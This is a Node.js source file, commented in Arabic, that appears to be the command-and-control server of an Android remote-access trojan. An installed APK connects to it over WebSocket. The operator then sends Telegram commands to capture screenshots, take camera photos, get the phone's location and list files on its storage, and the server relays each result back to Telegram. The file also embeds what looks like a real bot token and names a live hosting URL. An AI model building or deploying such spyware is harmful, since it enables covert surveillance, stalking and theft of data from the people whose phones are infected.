const express = require('express');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');
const http = require('http');

// 🔧 الإعدادات - ضع بياناتك هنا
const config = {
    TELEGRAM_TOKEN: "8273593857:AAGNyv_BOdm6D-w2Z16uNBDht1jXiyn_J5o", // ضع توكن البوت هنا
    AUTHORIZED_USERS: [7604667042], // ضع أيدي التلجرام الخاص بك هنا
    SERVER_PORT: process.env.PORT || 3000,
    SERVER_HOST: "0.0.0.0"
};

// التحقق من البيانات
if (config.TELEGRAM_TOKEN === "1234567890:ABCdefGHIjklMNopQRstUVwxYZ123456789") {
    console.log("❌ يرجى تغيير التوكن في السطر 9");
    process.exit(1);
}

if (config.AUTHORIZED_USERS[0] === 123456789) {
    console.log("❌ يرجى تغيير أيدي التلجرام في السطر 10");
    process.exit(1);
}

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// 🔧 إصلاح: استخدام webhook فقط بدون polling
const bot = new TelegramBot(config.TELEGRAM_TOKEN);

const connectedDevices = new Map();
const userSessions = new Map();

app.use(express.json());

// 🔧 مسار ويب لفحص السيرفر
app.get('/', (req, res) => {
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    res.json({
        status: '✅ السيرفر يعمل',
        your_ip: clientIP,
        connected_devices: Array.from(connectedDevices.keys()),
        total_devices: connectedDevices.size,
        webSocket: '✅ نشط',
        telegram_bot: '✅ جاهز'
    });
});

// 🔧 مسار لاستقبال رسائل التلجرام (webhook)
app.post('/webhook', express.json(), (req, res) => {
    try {
        const update = req.body;
        console.log('📨 رسالة من التلجرام:', update.message?.text);
        
        // معالجة الرسالة يدوياً
        handleTelegramUpdate(update);
        
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ خطأ في webhook:', error);
        res.sendStatus(200);
    }
});

// 🔌 اتصال WebSocket من APK
wss.on('connection', (ws, req) => {
    // 🔧 إصلاح: الحصول على IP حقيقي من Render
    const clientIP = req.headers['x-forwarded-for'] || 
                    req.socket.remoteAddress;
    
    const deviceId = generateDeviceId();
    
    console.log(`🔗 اتصال WebSocket جديد`);
    console.log(`📱 المعرف: ${deviceId}`);
    console.log(`🌐 IP: ${clientIP}`);
    console.log(`📡 Headers:`, JSON.stringify(req.headers, null, 2));
    
    connectedDevices.set(deviceId, {
        ws: ws,
        ip: clientIP,
        connectedAt: new Date(),
        info: {},
        headers: req.headers
    });

    // 🔧 إرسال رسالة ترحيب
    setTimeout(() => {
        try {
            if (ws.readyState === ws.OPEN) {
                ws.send(JSON.stringify({
                    type: 'welcome',
                    deviceId: deviceId,
                    message: 'تم الاتصال بنجاح',
                    timestamp: Date.now(),
                    server: 'Render.com',
                    status: 'connected'
                }));
                console.log(`✅ تم إرسال الترحيب لـ ${deviceId}`);
                
                // 🔧 طلب معلومات الجهاز
                setTimeout(() => {
                    sendToDevice(deviceId, {
                        type: 'get_device_info',
                        timestamp: Date.now()
                    });
                }, 1000);
            }
        } catch (error) {
            console.error(`❌ فشل إرسال الترحيب:`, error);
        }
    }, 500);

    // 📩 استقبال البيانات من APK
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            console.log(`📨 من ${deviceId}: ${message.type}`, message);
            handleAPKMessage(deviceId, message);
        } catch (error) {
            console.error(`❌ خطأ في معالجة رسالة ${deviceId}:`, error.message);
        }
    });

    ws.on('close', () => {
        console.log(`❌ انقطع ${deviceId}`);
        connectedDevices.delete(deviceId);
    });

    ws.on('error', (error) => {
        console.error(`❌ خطأ WebSocket ${deviceId}:`, error);
    });
});

// ⚡ معالجة رسائل APK
function handleAPKMessage(deviceId, message) {
    const device = connectedDevices.get(deviceId);
    if (!device) return;

    switch (message.type) {
        case 'device_info':
            device.info = message.data;
            console.log(`📊 معلومات ${deviceId}:`, message.data);
            
            // 🔧 إرسال رسالة للتلجرام عبر HTTP
            sendTelegramMessage(
                `📱 **جهاز متصل جديد**\n` +
                `🎯 المعرف: ${deviceId}\n` +
                `📱 الموديل: ${message.data.model || 'غير معروف'}\n` +
                `🤖 أندرويد: ${message.data.androidVersion || 'غير معروف'}\n` +
                `🔋 البطارية: ${message.data.battery || 'غير معروف'}%\n` +
                `🌐 IP: ${device.ip}\n` +
                `🕒 الوقت: ${new Date().toLocaleString()}`
            );
            break;

        case 'location':
            console.log(`📍 موقع ${deviceId}:`, message.data);
            sendTelegramMessage(
                `📍 **موقع الجهاز**\n` +
                `🎯 ${deviceId}\n` +
                `📌 خط الطول: ${message.data.longitude}\n` +
                `📌 خط العرض: ${message.data.latitude}\n` +
                `🕒 ${new Date(message.timestamp).toLocaleString()}`
            );
            break;

        case 'screenshot_result':
            sendTelegramMessage(
                message.success ? 
                `✅ تم التقاط لقطة شاشة من ${deviceId}` : 
                `❌ فشل في لقطة الشاشة من ${deviceId}`
            );
            break;

        case 'camera_result':
            if (message.success) {
                sendTelegramMessage(`✅ تم التقاط صورة من الكاميرا ${deviceId}`);
            }
            break;

        case 'file_list':
            const files = message.data?.files || [];
            sendTelegramMessage(
                `📁 ملفات ${deviceId}\n` +
                files.slice(0, 5).map(f => `📄 ${f}`).join('\n') +
                (files.length > 5 ? `\n... و ${files.length - 5} ملفات أخرى` : '')
            );
            break;

        default:
            console.log(`📨 رسالة غير معروفة من ${deviceId}:`, message);
    }
}

// 🤖 معالجة رسائل التلجرام يدوياً
function handleTelegramUpdate(update) {
    if (!update.message) return;
    
    const chatId = update.message.chat.id;
    const text = update.message.text;
    
    if (!config.AUTHORIZED_USERS.includes(chatId)) {
        return sendTelegramToUser(chatId, '❌ غير مصرح لك بالوصول');
    }

    console.log(`🤖 معالجة أمر: ${text} من ${chatId}`);

    // معالجة الأوامر
    if (text === '/start') {
        sendTelegramToUser(chatId,
            `🎮 **مرحباً بك في نظام التحكم**\n\n` +
            `الأجهزة المتصلة: ${connectedDevices.size}\n\n` +
            `استخدم:\n` +
            `/devices - لعرض الأجهزة\n` +
            `/screen device_id - لقطة شاشة\n` +
            `/location device_id - الموقع\n` +
            `/files device_id - الملفات\n` +
            `/camera device_id - الكاميرا`
        );
    }
    else if (text === '/devices') {
        if (connectedDevices.size === 0) {
            sendTelegramToUser(chatId, '❌ لا توجد أجهزة متصلة');
        } else {
            let devicesList = '📱 **الأجهزة المتصلة:**\n\n';
            connectedDevices.forEach((device, deviceId) => {
                devicesList += `🔹 ${deviceId}\n📍 ${device.ip}\n\n`;
            });
            sendTelegramToUser(chatId, devicesList);
        }
    }
    else if (text.startsWith('/screen ')) {
        const deviceId = text.replace('/screen ', '').trim();
        const success = sendToDevice(deviceId, { type: 'take_screenshot' });
        sendTelegramToUser(chatId, 
            success ? `📸 جاري أخذ لقطة من ${deviceId}...` : `❌ ${deviceId} غير متصل`
        );
    }
    else if (text.startsWith('/location ')) {
        const deviceId = text.replace('/location ', '').trim();
        const success = sendToDevice(deviceId, { type: 'get_location' });
        sendTelegramToUser(chatId, 
            success ? `📍 جاري الحصول على موقع ${deviceId}...` : `❌ ${deviceId} غير متصل`
        );
    }
    else if (text.startsWith('/files ')) {
        const deviceId = text.replace('/files ', '').trim();
        const success = sendToDevice(deviceId, { type: 'list_files', path: '/sdcard/' });
        sendTelegramToUser(chatId, 
            success ? `📁 جاري استعراض ملفات ${deviceId}...` : `❌ ${deviceId} غير متصل`
        );
    }
    else if (text.startsWith('/camera ')) {
        const deviceId = text.replace('/camera ', '').trim();
        const success = sendToDevice(deviceId, { type: 'take_camera_photo', camera: 'back' });
        sendTelegramToUser(chatId, 
            success ? `📷 جاري التقاط صورة من ${deviceId}...` : `❌ ${deviceId} غير متصل`
        );
    }
}

// ⚡ إرسال أمر لجهاز
function sendToDevice(deviceId, command) {
    const device = connectedDevices.get(deviceId);
    if (!device || !device.ws || device.ws.readyState !== WebSocket.OPEN) {
        console.log(`❌ ${deviceId} غير متصل`);
        return false;
    }

    try {
        device.ws.send(JSON.stringify(command));
        console.log(`✅ تم إرسال ${command.type} لـ ${deviceId}`);
        return true;
    } catch (error) {
        console.error(`❌ فشل إرسال لـ ${deviceId}:`, error);
        return false;
    }
}

// 📨 إرسال رسالة للتلجرام عبر HTTP
function sendTelegramMessage(message) {
    config.AUTHORIZED_USERS.forEach(userId => {
        sendTelegramToUser(userId, message);
    });
}

function sendTelegramToUser(chatId, message) {
    fetch(`https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (!data.ok) {
            console.error('❌ فشل إرسال للتلجرام:', data);
        }
    })
    .catch(error => {
        console.error('❌ خطأ في إرسال للتلجرام:', error);
    });
}

// 🛠️ وظائف مساعدة
function generateDeviceId() {
    return 'device_' + Math.random().toString(36).substring(2, 8);
}

// 🚀 بدء السيرفر
server.listen(config.SERVER_PORT, config.SERVER_HOST, () => {
    console.log(`✅ السيرفر يعمل على: http://${config.SERVER_HOST}:${config.SERVER_PORT}`);
    console.log(`🤖 بوت التلجرام جاهز (Webhook)`);
    console.log(`📱 جاهز لاستقبال اتصالات APK`);
    console.log(`🔗 رابط WebSocket: wss://bot-d4k2.onrender.com`);
    console.log(`🌐 للفحص: https://bot-d4k2.onrender.com`);
});

process.on('uncaughtException', (error) => {
    console.error('❌ خطأ غير متوقع:', error);
});
